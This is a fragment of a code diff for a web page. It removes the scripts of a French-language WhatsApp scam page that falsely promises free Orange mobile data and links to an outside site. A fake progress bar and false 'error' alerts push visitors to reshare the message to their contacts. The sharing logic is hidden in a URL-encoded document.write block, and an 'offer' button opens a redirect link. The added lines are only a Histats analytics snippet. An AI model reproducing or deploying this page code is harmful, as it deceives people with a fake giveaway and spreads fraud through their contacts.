-            if (i == 50) {
-                i = 49;
-                setTimeout(function () {
-                    i = 50;
-                }, 1000);
-            }
-            if (i >= 100) {
-                clearInterval(interval);
-                $("#load").fadeOut(0);
-                $("#check").fadeIn(0);
-                setTimeout(function () {
-                    $("#checking").fadeOut(0);
-                    $("#share").fadeIn(1000);
-                    $("#getname").html($("#name").val());
-                }, 500);
-            }
-        }, 50);
-    }
-});
-$(document).click(function () {
-    if ($("#name").is(":focus")) {
-        $(".error").fadeOut(500);
-    }
-});
-</script>
-
-
-
-
-<script>
-
-
-
-     var text1 = "*ORANGE 10GB - 100GB OFFRE SPÉCIALE POUR LES ANCIENS CLIENTS*%0A%0ALa société Orange récompense tous ses anciens utilisateurs avec 10 Go à 100 Go de données gratuites valables 3 mois%0A%0A✅Carte SIM de 6 mois - *10 Go*%0A✅1 an et plus - *30 Go*%0A✅5 ans et plus - *50 Go*%0A✅10 ans et plus - *100 Go*%0A%0ADépêchez-vous maintenant et vérifiez si votre *Carte SIM Orange* est éligible à cette offre spéciale%0A%0A*CONSULTEZ ICI*👇%0Ahttp://demobest.org/100gb",
-            text2 = " an amount of ",
-            text3 = "for every citizen who meets the conditions as an aid to the poor class to overcome the crisis. Enter and register now and make sure to register correctly 👉 ",
-            error = "Something is wrong!\nPosts are not calculated. You may have shared it with the same friend or group more than once, please re-share",
-            abcde = "http://outrotomr.com/4/3144603",
-            saved = "",
-            share = "whatsapp://send?text=" + text1;
-</script>
-      
-
-
-
-
-
-<script>
-<!-- code by OD -->
-document.write(unescape('%20%3Cscript%20type%3D%22text/javascript%22%3E%0A%20var%20swidth%20%3D%20localStorage.getItem%28saved%29%3B%0Aif%20%28swidth%20%21%3D%3D%20null%29%20%7B%0A%20%20%20%20var%20width%20%3D%20swidth%20*%201%3B%0A%20%20%20%20%24%28%22%23intro%22%29.fadeOut%280%29%3B%0A%20%20%20%20%24%28%22.comments%22%29.fadeOut%280%29%3B%0A%20%20%20%20%24%28%22%23share%22%29.fadeIn%280%29%3B%0A%20%20%20%20%24%28%22%23fill2%22%29.css%28%22width%22%2C%20width%20+%20%22%25%22%29%3B%0A%20%20%20%20%24%28%22%23percentage2%22%29.text%28width%20+%20%22%25%22%29%3B%0A%7D%20else%20%7B%0A%20%20%20%20var%20width%20%3D%200%3B%0A%7D%0A%24%28%22%23whatsapp%22%29.click%28function%20%28%29%20%7B%0A%20%20%20%20window.location.href%20%3D%20share%3B%0A%20%20%20%20if%20%28width%20%3D%3D%200%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%2050%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2050%29%20%7B%0A%20%20%20%20%20%20%20%20alert%28error%29%3B%0A%20%20%20%20%20%20%20%20width%20+%3D%2015%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2065%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%205%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2070%29%20%7B%0A%20%20%20%20%20%20%20%20alert%28error%29%3B%0A%20%20%20%20%20%20%20%20width%20+%3D%2010%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2080%29%20%7B%0A%20%20%20%20%20%20%20%20alert%28error%29%3B%0A%20%20%20%20%20%20%20%20width%20+%3D%205%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2085%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%202%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2087%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2088%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%202%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2090%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2091%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2092%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2093%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2094%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2095%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2096%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%202%3B%0A%20%20%20%20%7D%20else%20%7B%0A%20%20%20%20%20%20%20%20%24%28%22%23share%22%29.fadeOut%280%29%3B%0A%20%20%20%20%20%20%20%20%24%28%22%23claim%22%29.fadeIn%281000%29%3B%0A%20%20%20%20%7D%0A%20%20%20%20localStorage.setItem%28saved%2C%20width%29%3B%0A%20%20%20%20setTimeout%28function%20%28%29%20%7B%0A%20%20%20%20%20%20%20%20%24%28%22%23fill2%22%29.css%28%22width%22%2C%20width%20+%20%22%25%22%29%3B%0A%20%20%20%20%20%20%20%20%24%28%22%23percentage2%22%29.text%28width%20+%20%22%25%22%29%3B%0A%20%20%20%20%7D%2C%202000%29%3B%0A%7D%29%3B%0A%24%28%22%23offer%22%29.click%28function%20%28%29%20%7B%0A%20%20%20%20window.open%28abcde%2C%20%22_blank%22%29%3B%0A%7D%29%3B%0A%3C/script%3E'))
-</script>
-
-
-
-
-
-
-
-
- 
- 
-</div>
-
-  <script>/*<![CDATA[*/ cookieChoices = {}; /*]]>*/</script>
 </body></html>
+<!-- Histats.com START (aync)-->
+<script type="text/javascript">var _Hasync= _Hasync|| [];
+_Hasync.push(['Histats.start', '1,3355942,4,0,0,0,00010000']);
+_Hasync.push(['Histats.fasi', '1']);
+_Hasync.push(['Histats.track_hits', '']);
+(function() {
+var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
+hs.src = ('//s10.histats.com/js15_as.js');
+(document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
+})();</script>
